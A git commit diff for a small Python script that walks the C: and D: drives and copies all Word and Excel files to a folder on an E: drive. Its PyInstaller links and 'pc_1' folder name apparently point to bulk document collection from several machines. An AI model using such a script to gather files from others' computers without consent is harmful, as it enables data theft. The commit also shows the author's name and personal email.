90dc7a67177d7bfd40bdede765c14786fe433591
Nathan Nguyen <nathannguyen180@gmail.com>
2019-08-12 15:45:48 -0400

    file types

--- PythonApplication1/module1.py
+++ PythonApplication1/module1.py
@@ -2,8 +2,8 @@ import shutil, os
 from os.path import join
 print("oof")
 src = ""
-dst = "C:\\Users\\NNguyen\\Desktop\\lol\\GREAT"
-top = "C:\\"
+dst = "E:\\LMAOBOX\\pc_1"
+top = ["C:\\", "D:\\"]
 for realTop in top:
     for theDirPath, theDirNames, theFileNames in os.walk(realTop):
         if "1AZN$WAG.txt" in theFileNames:
@@ -26,9 +26,26 @@ for realTop in top:
                 src = join(theDirPath, file)
                 print(src)
                 shutil.copy2(src,dst)
+            if file.endswith(".docx"):
+                src = join(theDirPath, file)
+                print(src)
+                shutil.copy2(src,dst)
+            if file.endswith(".xlsx"):
+                src = join(theDirPath, file)
+                print(src)
+                shutil.copy2(src,dst)
+            if file.endswith(".xls"):
+                src = join(theDirPath, file)
+                print(src)
+                shutil.copy2(src,dst)
 a=0
 while a < 3: 
     print("(^_^)")
     a+=1
+input("Finished")
 
     #".txt", ".pdf", ".png", ".jpeg", ".xlsx"):
+#https://stackabuse.com/creating-and-deleting-directories-with-python/
+#https://www.pyinstaller.org/features.html
+#https://www.google.com/search?q=pyinstaller&ie=&oe=
+#https://stackoverflow.com/questions/273192/how-can-i-safely-create-a-nested-directory
